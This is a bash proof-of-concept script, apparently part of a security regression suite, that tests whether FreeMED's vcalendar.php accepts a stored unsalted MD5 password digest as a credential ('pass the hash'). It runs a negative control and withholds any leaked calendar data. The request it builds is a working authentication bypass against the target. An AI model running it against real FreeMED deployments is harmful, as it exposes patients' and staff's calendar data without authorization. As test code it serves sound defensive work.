#!/usr/bin/env bash
#
# repro-vcalendar-hash.sh - hostile repro for vcalendar.php "pass the hash"
#
# freemed_get_auth() compares the GET `hash` parameter directly against the
# stored userpassword column:
#   SELECT ... FROM user WHERE username='<user>' AND userpassword='<hash>'
# The stored column is an unsalted MD5 digest, so anyone who can read the
# database (see repro-help-traversal.sh) - or who guesses - can authenticate and
# pull calendar data without ever knowing the password. The digest IS the
# credential in this attack, which is why the request URL is printed in full:
# it is the injected payload, and an evidence file has to show what produced a
# leak.
#
# Usage:
#   BASE=http://localhost:38081 FREEMED_TEST_USER=admin FREEMED_TEST_PW=... \
#     ./repro-vcalendar-hash.sh
#
# Environment (no credential is ever hardcoded):
#   BASE              base URL of the deployment (default http://localhost:38081)
#   FREEMED_TEST_USER user to authenticate as (default "admin" - a username, not a secret)
#   FREEMED_TEST_PW   password whose MD5 is sent as `hash` (NO default: the probe
#                     fails closed, exit 2, when it is empty - MD5('') is not a
#                     credential and would report a meaningless "not vulnerable")
#   TIMEOUT           per-request curl timeout in seconds (default 20)
#
# NEGATIVE CONTROL (why this probe is not a second false-clean)
#
# A 0-byte 200 is what an endpoint that never got as far as answering looks
# like, and it is also what an accepted-but-eventless calendar looks like. So
# the script fires the same request a second time with a hash that cannot match
# any credential and compares the two.
#
# HOW A RUN IS JUDGED (this is the rule the branches below implement)
#
#   EXPLOITED       the accepted-credential response carries a calendar payload
#                   (Content-Type: text/x-vCalendar or BEGIN:VCALENDAR). Bytes
#                   withheld. Exit 1.
#   EXPLOITED       the accepted-credential response is NOT a rejection while the
#                   negative control IS one. The only input that differed is the
#                   digest, so the endpoint's answer changed because the digest
#                   changed: it treated the stored digest as a credential. That
#                   is the defect, even when no calendar body was observed. Both
#                   bodies are withheld. Exit 1.
#   INCONCLUSIVE    the two responses are byte-identical: the endpoint cannot
#                   show whether the digest was accepted or rejected here, so
#                   nothing was measured (empty 200 for a valid digest, a bogus
#                   digest and no digest at all is what the FreeMED verify stack
#                   does - see below). Exit 2.
#   INCONCLUSIVE    they differ but NEITHER response is a rejection (no
#                   "Not authorized." and no 401/403), so no accept/reject
#                   pattern is established. Exit 2.
#   CLEAN           the accepted-credential request was explicitly REJECTED
#                   ("Not authorized." / 401 / 403 / "Authentication required")
#                   and the control differs from it (that difference is what
#                   proves this probe can tell responses apart). Only in this
#                   branch may the accepted-credential body be printed. Exit 0.
#
# A DISTINGUISHABLE pair whose accepted-credential response carries NO marker is
# therefore never reported as "no exploit observed": a response that changes only
# because the digest changed is evidence the digest was recognised, and the
# verdict says exactly which half of that was and was not measured.
#
# REDACTION: a response body is printed only when it carries no calendar marker
# AND the request it answers is not classified as accepted. Matched bodies and
# the accepted-credential body are reported by size and marker name instead,
# bytes withheld.
#
# ARGV: the plaintext password is never printed, written to a file, or placed on
# a command line. The request URL - which carries the digest, the payload of
# this attack - is fed to curl through a config file on stdin (`curl -K -`), so
# no digest byte appears in argv either; only the output/header paths do.
#
# Expect pre-fix where the endpoint works: HTTP 200 with
# Content-Type: text/x-vCalendar and a BEGIN:VCALENDAR body. Expect post-fix:
# "Not authorized." and no calendar body.
#
# Exit codes:
#   0  measured negative - the digest was demonstrably rejected
#   1  EXPLOITED - the MD5 digest alone was accepted (calendar body, or a
#      response that differs from the impossible-digest control only because of
#      the digest)
#   2  inconclusive - FREEMED_TEST_PW empty, no md5 implementation, no response,
#      or accepted/rejected responses are indistinguishable
#
# NO --self-test, and why that is not a gap in this file: the plan mandated a
# --self-test only for the traversal probe (Task 0.1 / ruling R7). This script's
# sensitivity is instead STRUCTURAL and is re-exercised on every run: it fires
# the accepted-digest request AND a negative control whose digest cannot match,
# and reports CLEAN only when the digest request was explicitly rejected and the
# control differed. A response that changes only because the digest changed is
# reported EXPLOITED even with no calendar body, and an indistinguishable pair is
# INCONCLUSIVE (exit 2) - so the 0-byte-200 false-clean class is designed out
# rather than asserted away. The committed transcript that shows both the 401
# rows and the pre-fix accepted rows is
# tests/security/evidence/vcalendar-auth.txt (and the task-3.1 provider-scope
# transcript beside it). A reader looking for a --self-test here should read
# those runs instead: there is none to run.
#
# Only `set -u` is used; a failed curl must not abort the run.
set -u

BASE="${BASE:-http://localhost:38081}"
FREEMED_TEST_USER="${FREEMED_TEST_USER:-admin}"
FREEMED_TEST_PW="${FREEMED_TEST_PW:-}"
TIMEOUT="${TIMEOUT:-20}"
TMPDIR="${TMPDIR:-/tmp}"

# Fail closed before anything else: with an empty password this probe would send
# MD5('') and report a clean "not vulnerable", which is not a measurement.
if [ -z "$FREEMED_TEST_PW" ]; then
  cat >&2 <<EOF
repro: INCONCLUSIVE - FREEMED_TEST_PW is empty, so there is nothing to hash.

This probe replays MD5(FREEMED_TEST_PW) as the \`hash\` parameter. With an empty
password it would send MD5('') and report "not vulnerable" without ever sending
a real credential - a false clean. Refusing to run.

  FREEMED_TEST_USER=admin FREEMED_TEST_PW=<password> BASE=<url> $(basename "$0")

Never hardcode the password here: it belongs in the environment only.
EOF
  exit 2
fi

# Temp files: mktemp only, no predictable fallback path anywhere.
mk_tmp() {
  local f
  f="$(mktemp "${TMPDIR%/}/$1.XXXXXX")" || return 1
  printf '%s' "$f"
}
MKTMP_FAIL='repro: mktemp failed - refusing to fall back to a predictable path'
BODY="$(mk_tmp freemed-vcal-body)"       || { printf '%s\n' "$MKTMP_FAIL" >&2; exit 2; }
HDR="$(mk_tmp freemed-vcal-hdr)"         || { printf '%s\n' "$MKTMP_FAIL" >&2; exit 2; }
CTLBODY="$(mk_tmp freemed-vcal-ctl-body)" || { printf '%s\n' "$MKTMP_FAIL" >&2; exit 2; }
CTLHDR="$(mk_tmp freemed-vcal-ctl-hdr)"  || { printf '%s\n' "$MKTMP_FAIL" >&2; exit 2; }

cleanup() { rm -f "$BODY" "$HDR" "$CTLBODY" "$CTLHDR"; return 0; }
on_signal() {
  printf '\nrepro: interrupted\n' >&2
  cleanup
  exit 130
}
trap cleanup EXIT
trap on_signal INT TERM HUP

md5_of() {
  if command -v md5sum >/dev/null 2>&1; then
    printf '%s' "$1" | md5sum | cut -d' ' -f1
  elif command -v md5 >/dev/null 2>&1; then
    printf '%s' "$1" | md5
  elif command -v openssl >/dev/null 2>&1; then
    printf '%s' "$1" | openssl dgst -md5 | awk '{print $NF}'
  else
    return 1
  fi
}

HASH="$(md5_of "$FREEMED_TEST_PW")" || {
  printf 'repro: no md5 implementation found (md5sum/md5/openssl); cannot build the hash\n' >&2
  exit 2
}
# Negative control: a digest derived from a random nonce, so it cannot be any
# stored userpassword. Built here, never from the environment.
NONCE="repro-nonexistent-$$-${RANDOM:-0}-$(date +%s 2>/dev/null)"
CTL_HASH="$(md5_of "$NONCE")" || CTL_HASH='ffffffffffffffffffffffffffffffff'

printf 'repro: vcalendar.php pass-the-hash (GET hash = MD5(password)) + negative control\n'
printf 'base=%s  user=%s  pw=%s  hash=%s (the replayed digest - this IS the attack payload)\n' \
  "$BASE" "$FREEMED_TEST_USER" \
  "$([ -n "$FREEMED_TEST_PW" ] && printf '<set>' || printf '<empty>')" "$HASH"
printf 'note: a response body is printed only when it carries no calendar marker AND the\n'
printf '      request it answers is not classified as accepted; every withheld body is\n'
printf '      reported by size and marker name instead, never printed.\n'
printf 'note: the digest and the payload never appear in curl argv (the URL goes in on\n'
printf '      stdin via `curl -K -`).\n\n'

P_CODE=""
P_CTYPE=""
# probe <url> <hdrfile> <bodyfile> -> prints the row, sets P_CODE / P_CTYPE
# The URL (which carries the digest) is handed to curl through a config file on
# stdin: `curl -K -` reads `url = "..."` from stdin, so the digest - and every
# other payload byte - stays out of ps(1) / /proc/<pid>/cmdline.
probe() {
  local url="$1" hdrf="$2" bodyf="$3" cfg
  printf 'GET %s\n' "$url"
  cfg="$(printf 'url = "%s"\n' "$(printf '%s' "$url" | sed 's/\\/\\\\/g; s/"/\\"/g')")"
  P_CODE="$(printf '%s' "$cfg" | curl -s --max-time "$TIMEOUT" -K - -D "$hdrf" -o "$bodyf" -w '%{http_code}')"
  P_CODE="${P_CODE:-000}"
  P_CTYPE="$(grep -i '^content-type:' "$hdrf" | head -n 1 | tr -d '\r' | sed 's/^[Cc]ontent-[Tt]ype: *//')"
  printf 'HTTP %s\n' "$P_CODE"
  printf 'Content-Type: %s  bytes=%s\n' "${P_CTYPE:-<none>}" "$(wc -c <"$bodyf" | tr -d ' ')"
}

# An explicit rejection: a status a web server/Basic-auth would use, or a body
# that says the credential was refused. Anything else counts as "not rejected".
rejected() { # <bodyfile> <code>
  case "$2" in
    401|403) return 0 ;;
  esac
  grep -qiE 'Not authorized|Authentication required|Unauthorized|Access denied|Forbidden' "$1"
}

# The URL is the payload - printed in full so the evidence shows the request that
# produced a leak. The plaintext password is never printed, written to a file, or
# placed on a command line.
probe "$BASE/vcalendar.php?user=$FREEMED_TEST_USER&hash=$HASH" "$HDR" "$BODY"
CODE="$P_CODE"
CTYPE="$P_CTYPE"
printf '\n'

if [ "$CODE" = "000" ]; then
  printf '>>> RESULT: INCONCLUSIVE - no response from %s\n' "$BASE"
  exit 2
fi

# Leak markers on the accepted-credential response.
matched=0
if printf '%s' "$CTYPE" | grep -qi 'x-vCalendar'; then
  matched=1
  printf '>>> EXPLOITED: hash-only auth accepted (Content-Type: text/x-vCalendar)\n'
fi
if grep -q 'BEGIN:VCALENDAR' "$BODY"; then
  matched=1
  printf '>>> EXPLOITED: iCalendar payload served without the plaintext password\n'
fi

if [ "$matched" -eq 1 ]; then
  printf 'body(%s bytes): WITHHELD - a leak marker matched, so no calendar bytes are printed\n' \
    "$(wc -c <"$BODY" | tr -d ' ')"
  printf '>>> RESULT: EXPLOITED - vcalendar.php accepts the stored MD5 digest as proof of identity\n'
  printf '    What was measured: the request carrying only MD5(FREEMED_TEST_PW) as `hash`\n'
  printf '    returned a calendar payload (HTTP %s, Content-Type %s).\n' "$CODE" "${CTYPE:-<none>}"
  printf '    What was NOT measured: how far that access reaches - the body is withheld.\n'
  exit 1
fi

# Negative control: the same request with a digest that cannot match anything.
printf -- '-- negative control: digest that cannot match any credential\n'
probe "$BASE/vcalendar.php?user=$FREEMED_TEST_USER&hash=$CTL_HASH" "$CTLHDR" "$CTLBODY"
CTL_CODE="$P_CODE"
CTL_CTYPE="$P_CTYPE"
CTL_BYTES="$(wc -c <"$CTLBODY" | tr -d ' ')"
if grep -q 'BEGIN:VCALENDAR' "$CTLBODY"; then
  printf 'body(%s bytes): WITHHELD - a calendar marker matched in the control response\n' "$CTL_BYTES"
else
  printf 'body(no calendar marker matched, excerpt as received): %s\n' \
    "$(head -c 160 "$CTLBODY" | tr '\n\r\t' '   ')"
fi
printf '\n'

if [ "$CTL_CODE" = "000" ]; then
  printf '>>> RESULT: INCONCLUSIVE - the negative control got no response, so nothing was proven\n'
  exit 2
fi

if [ "$CTL_CODE" = "$CODE" ] && [ "$CTL_CTYPE" = "$CTYPE" ] && cmp -s "$BODY" "$CTLBODY"; then
  printf '>>> RESULT: INCONCLUSIVE - the accepted-credential response and the negative control are\n'
  printf '    indistinguishable (both HTTP %s, Content-Type %s, identical %s-byte body),\n' \
    "$CODE" "${CTYPE:-<none>}" "$CTL_BYTES"
  printf '    so this endpoint cannot show whether the digest was accepted or rejected here.\n'
  printf '    Nothing was measured: do NOT read this as "not vulnerable".\n'
  printf '    Check the endpoint by hand (syslog/error log, or a request that reaches the\n'
  printf '    calendar code, e.g. with the physician/type/day parameters this file expects)\n'
  printf '    before treating vcalendar as fixed.\n'
  exit 2
fi

# The two responses differ. Classify by rejection, not by byte diff: the only
# input that changed was the digest.
digest_rejected=0
ctl_rejected=0
rejected "$BODY" "$CODE" && digest_rejected=1
rejected "$CTLBODY" "$CTL_CODE" && ctl_rejected=1
DIGEST_BYTES="$(wc -c <"$BODY" | tr -d ' ')"
printf -- '-- differential: accepted-credential HTTP %s / %s / %s bytes (rejection marker: %s);\n' \
  "$CODE" "${CTYPE:-<none>}" "$DIGEST_BYTES" "$([ "$digest_rejected" = 1 ] && printf present || printf absent)"
printf '   control HTTP %s / %s / %s bytes (rejection marker: %s)\n' \
  "$CTL_CODE" "${CTL_CTYPE:-<none>}" "$CTL_BYTES" "$([ "$ctl_rejected" = 1 ] && printf present || printf absent)"

if [ "$digest_rejected" = "1" ]; then
  # Measured negative: the replayed digest was explicitly refused. Only here may
  # the accepted-credential body be printed.
  printf 'body(no calendar marker matched, excerpt as received): %s\n' \
    "$(head -c 160 "$BODY" | tr '\n\r\t' '   ')"
  printf '>>> RESULT: NO EXPLOIT OBSERVED (measured negative, exit 0)\n'
  printf '    What WAS measured: the request carrying MD5(FREEMED_TEST_PW) as `hash` was\n'
  printf '    explicitly REJECTED (HTTP %s, %s, %s bytes), and the negative control with a\n' \
    "$CODE" "${CTYPE:-<none>}" "$DIGEST_BYTES"
  printf '    digest that cannot match any credential answered differently (HTTP %s, %s,\n' \
    "$CTL_CODE" "${CTL_CTYPE:-<none>}"
  printf '    %s bytes) - so the two requests are distinguishable and the digest did not\n' "$CTL_BYTES"
  printf '    authenticate this one.\n'
  printf '    What was NOT measured: no calendar data was requested in either request, so this\n'
  printf '    says nothing about what an ACCEPTED digest could read, and nothing about the\n'
  printf '    other parameters (physician/type/day) this endpoint takes.\n'
  if [ "$ctl_rejected" = "0" ]; then
    printf '    CAVEAT: the control was not itself rejected (%s bytes, no rejection marker),\n' "$CTL_BYTES"
    printf '    which is unexpected - treat this negative as weaker than the wording above.\n'
  fi
  exit 0
fi

if [ "$ctl_rejected" = "1" ]; then
  printf '>>> EXPLOITED: the replayed digest ALONE passed the credential check\n'
  printf '    What WAS measured: the only difference between the two requests was the digest.\n'
  printf '    The request carrying MD5(FREEMED_TEST_PW) was NOT rejected (HTTP %s, %s,\n' \
    "$CODE" "${CTYPE:-<none>}"
  printf '    %s bytes, no rejection marker), while the control carrying a digest that cannot\n' "$DIGEST_BYTES"
  printf '    match any stored credential WAS rejected (HTTP %s, %s, %s bytes). An endpoint\n' \
    "$CTL_CODE" "${CTL_CTYPE:-<none>}" "$CTL_BYTES"
  printf '    whose answer changes only because the digest changed is treating the stored\n'
  printf '    digest as a credential - that is the pass-the-hash defect.\n'
  printf '    What was NOT measured: no calendar payload (text/x-vCalendar / BEGIN:VCALENDAR)\n'
  printf '    came back in either response, so this run does not show what data the accepted\n'
  printf '    digest can read - only that the digest passed the check. The remaining\n'
  printf '    physician/type/day parameters this file expects were not exercised.\n'
  printf '    body(%s bytes): WITHHELD - the accepted-credential response is not printed\n' "$DIGEST_BYTES"
  printf '    (an endpoint that distinguished the digest may return data for it).\n'
  exit 1
fi

printf '>>> RESULT: INCONCLUSIVE - the two responses differ, but NEITHER the accepted-credential\n'
printf '    request nor the negative control carries a rejection marker (HTTP %s vs %s, %s vs\n' \
  "$CODE" "$CTL_CODE" "$DIGEST_BYTES"
printf '    %s bytes), so no accept/reject pattern is established and nothing was measured.\n' "$CTL_BYTES"
printf '    Do NOT read this as "not vulnerable": check the endpoint by hand (syslog/error log,\n'
printf '    or a request that reaches the calendar code with its physician/type/day parameters)\n'
printf '    before treating vcalendar as fixed.\n'
exit 2
